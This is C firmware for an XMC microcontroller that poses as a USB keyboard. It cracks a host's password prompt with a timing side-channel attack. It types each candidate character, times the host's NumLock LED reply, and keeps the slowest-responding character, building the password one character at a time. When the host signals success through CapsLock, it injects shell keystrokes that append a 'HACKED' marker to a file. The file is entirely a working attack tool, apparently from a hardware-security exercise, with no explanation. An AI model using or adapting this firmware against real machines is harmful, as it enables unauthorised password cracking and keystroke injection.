
#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0

bool feedback_received=0, cracked=0, sent=0, initial_feedback=0, max_found=0;
uint8_t mReset=0, p=0;
uint8_t NUMLOCK_PRESSES=0, ready_to_Enter=0, maxI=0, maxJ=0;
//float log[100];
float sending_time=0, response_time=0;
struct correct_key {
    uint8_t code;
    uint8_t modifier;
};
struct KEY {
    uint8_t code;
    uint8_t possible_modifiers[3];
	uint8_t number_of_modifiers;
	float time[3];
};
struct KEY keys[44] = 
{{GERMAN_KEYBOARD_SC_A , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_B , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_C , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_D , {0,1<<1},2, {0,0}},
 {GERMAN_KEYBOARD_SC_E , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_F , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_G , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_H , {0,1<<1},2, {0,0}}, 
 {GERMAN_KEYBOARD_SC_I ,{0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_J , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_K , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_L , {0,1<<1},2, {0,0}},
 {GERMAN_KEYBOARD_SC_M , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_N , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_O , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_P , {0,1<<1},2,{0,0}},
 {GERMAN_KEYBOARD_SC_Q , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_R , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_S , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_T , {0,1<<1},2, {0,0}},
 {GERMAN_KEYBOARD_SC_U , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_V , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_W , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_X , {0,1<<1},2, {0,0}},
 {GERMAN_KEYBOARD_SC_Y , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_Z , {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION  , {0,1<<1},2, {0,0}},
{GERMAN_KEYBOARD_SC_2_AND_QUOTES, {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_4_AND_DOLLAR , {0,1<<1},2, {0,0}},
{GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE , {0,1<<1},2, {0,0}},{GERMAN_KEYBOARD_SC_6_AND_AMPERSAND , {0,1<<1},2, {0,0}}, 
{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE  , {0,1<<1, 1<<6},3, {0,0,0}}, {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET  , {0,1<<1, 1<<6},3, {0,0,0}},
{GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET  , {0,1<<1, 1<<6},3, {0,0,0}},{GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, {0,1<<1, 1<<6},3, {0,0,0}},
 {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, {0,1<<1, 1<<6},3, {0,0,0}}, {GERMAN_KEYBOARD_SC_CARET_AND_DEGREE, {0,1<<1},2, {0,0,0}}, 
 {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE , {0,1<<1, 1<<6},3, {0,0,0}},{GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE, {0,1<<1},2, {0,0}},
 {GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, {0,1<<1},2, {0,0,0}},{GERMAN_KEYBOARD_SC_DOT_AND_COLON, {0,1<<1},2, {0,0}}, {GERMAN_KEYBOARD_SC_HASHMARK_AND_APOSTROPHE, {0,1<<1},2, {0,0}},
  {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, {0,1<<1, 1<<6},3, {0,0,0}}};

/*!< DWT Control register */
#define KIN1_DWT_CONTROL             (*((volatile uint32_t*)0xE0001000))

/*!< CYCCNTENA bit in DWT_CONTROL register */
#define KIN1_DWT_CYCCNTENA_BIT       (1UL<<0)

/*!< DWT Cycle Counter register */
#define KIN1_DWT_CYCCNT              (*((volatile uint32_t*)0xE0001004))

/*!< DEMCR: Debug Exception and Monitor Control Register */
#define KIN1_DEMCR                   (*((volatile uint32_t*)0xE000EDFC))

/*!< Trace enable bit in DEMCR register */
#define KIN1_TRCENA_BIT              (1UL<<24)

#define KIN1_InitCycleCounter() \
  KIN1_DEMCR |= KIN1_TRCENA_BIT

/*!< Reset cycle counter */
#define KIN1_ResetCycleCounter() \
  KIN1_DWT_CYCCNT = 0

/*!< Enable cycle counter */
#define KIN1_EnableCycleCounter() \
  KIN1_DWT_CONTROL |= KIN1_DWT_CYCCNTENA_BIT

/*!< Disable cycle counter */
#define KIN1_DisableCycleCounter() \
  KIN1_DWT_CONTROL &= ~KIN1_DWT_CYCCNTENA_BIT

/*!< Read cycle counter register */
#define KIN1_GetCycleCounter() \
  KIN1_DWT_CYCCNT

float millisec=0.0; 
/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */

void getMaxResponse()
{

	float max = -1;
	for (int i=0; i<45; i++)
	{
		for (int j=0; j<keys[i].number_of_modifiers; j++)
		{
			if(keys[i].time[j]>max)
				{
					max=keys[i].time[j];
					maxI=i;
					maxJ=j;
				}

		}

	}

}
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
		; 

	float sample=0.0, previous_reading=0.0;
    KIN1_InitCycleCounter(); 
    KIN1_ResetCycleCounter(); 
    KIN1_EnableCycleCounter(); 	

	while (1) {
		sample=KIN1_GetCycleCounter()/120000.0;
		millisec=millisec+sample-previous_reading;
		previous_reading=sample;
		if(sample>=10000) 
		{
		KIN1_ResetCycleCounter();
		previous_reading=0;
		}
		HID_Device_USBTask(&Keyboard_HID_Interface);
		
	}
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo, uint8_t* const ReportID, const uint8_t ReportType, void* ReportData, uint16_t* const ReportSize ) {
	
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	static uint8_t characterSent = 0, indexToSend = 0, c=0;
	static struct correct_key pass[100];
	static uint8_t i=0,j=0,x=0,y=0,  acc=0, iindex=0, jindex=0;
	static uint8_t CMD_msg[28] = { GERMAN_KEYBOARD_SC_C, GERMAN_KEYBOARD_SC_D, GERMAN_KEYBOARD_SC_ENTER,
GERMAN_KEYBOARD_SC_E, GERMAN_KEYBOARD_SC_C, GERMAN_KEYBOARD_SC_H, GERMAN_KEYBOARD_SC_O, GERMAN_KEYBOARD_SC_SPACE, GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,
GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE,GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, GERMAN_KEYBOARD_SC_2_AND_QUOTES, GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET,GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH,GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE,GERMAN_KEYBOARD_SC_SPACE,
GERMAN_KEYBOARD_SC_2_AND_QUOTES,GERMAN_KEYBOARD_SC_H, GERMAN_KEYBOARD_SC_A,GERMAN_KEYBOARD_SC_C, GERMAN_KEYBOARD_SC_K,GERMAN_KEYBOARD_SC_E,GERMAN_KEYBOARD_SC_D, GERMAN_KEYBOARD_SC_2_AND_QUOTES, GERMAN_KEYBOARD_SC_ENTER };
static uint8_t CMD_mod[28] = {2,2,0,2,2,2,2,0,2,2,0,0,0,0,0,0,0,0,0,2,2,2,2,2,2,2,2,0};
if(cracked){
	if(indexToSend < 28) {
		if(characterSent) {
			report->Modifier = 0; 
			report->Reserved = 0; 
			report->KeyCode[0] = 0; 
			characterSent = 0;
			++indexToSend; 
		} else {
			report->Modifier = CMD_mod[indexToSend]; 
			report->Reserved = 0; 
			report->KeyCode[0] = CMD_msg[indexToSend]; 
			characterSent = 1;
		}
}
}
else if(i <= 44 && ((feedback_received && NUMLOCK_PRESSES>1)||!sent)) {
	
	
	
response_time=millisec-sending_time;

			
		if(max_found){

			iindex=maxI;
			jindex=maxJ;
			pass[acc].code=keys[iindex].code;
			pass[acc].modifier=keys[iindex].possible_modifiers[jindex];
			acc++;
			i=0; j=0;
			p=0;
			max_found=0;
			ready_to_Enter=3;
		}
		else if(feedback_received)
		{
			keys[i].time[j]=response_time;
			if(i==43 && j==keys[i].number_of_modifiers-1) 
		{
			getMaxResponse();
			max_found=1;
		}

				j++;
				mReset=2;
		if(j==keys[i].number_of_modifiers)
			{
				i++;
				j=0;
				mReset=1;
			}

		}

		
	if(ready_to_Enter==0 && i<45) {
		x=keys[i].code;
		y=keys[i].possible_modifiers[j];
	
		ready_to_Enter=2;
		sent=0;
		//p=0;

	}
	else if (ready_to_Enter==1 && i<45 )
	{
		
		x=GERMAN_KEYBOARD_SC_ENTER;
		y=0;
		if (acc==0)ready_to_Enter=0;
		else ready_to_Enter=3;
		sent=1;
	}
	else if (ready_to_Enter==2)
	{
		x=0;
		y=0;
		//if(p==0) ready_to_Enter=1;
		//else ready_to_Enter=0;
		ready_to_Enter=1;
		sent=0;
	}
	else if (ready_to_Enter==3)
	{
		if(p<acc){
		x=pass[p].code;
		y=pass[p].modifier;
		p++;
		ready_to_Enter=3;
		sent=0;
		//mReset=3;
		}
		else 
		{
			ready_to_Enter=0;
			p=0;
		}
	
	}
	else
	{
		x=0;
		y=0;

	}
	//}

//	static uint8_t stringToSend[2] = {GERMAN_KEYBOARD_SC_N, GERMAN_KEYBOARD_SC_ENTER};

	

			report->Modifier = y; 
			report->Reserved = 0; 
			report->KeyCode[0] = x; 
			//characterSent = 1;
			//ready_to_Enter=2;
	//	}
	

	if(x==GERMAN_KEYBOARD_SC_ENTER) 
	{
	//	sent=1;
	sending_time=millisec;
	
	}

		feedback_received=0;
	
	}


	return true;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	if(*report & HID_KEYBOARD_LED_NUMLOCK) {
		XMC_GPIO_SetOutputHigh(LED1);
		if(initial_feedback) 
		{
			if(NUMLOCK_PRESSES>0) feedback_received=1;
			initial_feedback=0;
			NUMLOCK_PRESSES++;
			if(NUMLOCK_PRESSES>10) NUMLOCK_PRESSES=2;
		}

	}
	else 
	{
		XMC_GPIO_SetOutputLow(LED1);
		initial_feedback=1;

	}
	if(*report & HID_KEYBOARD_LED_CAPSLOCK) 
		{
			XMC_GPIO_SetOutputHigh(LED2);
			cracked=1;
		}
	else 
		XMC_GPIO_SetOutputLow(LED2);
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}


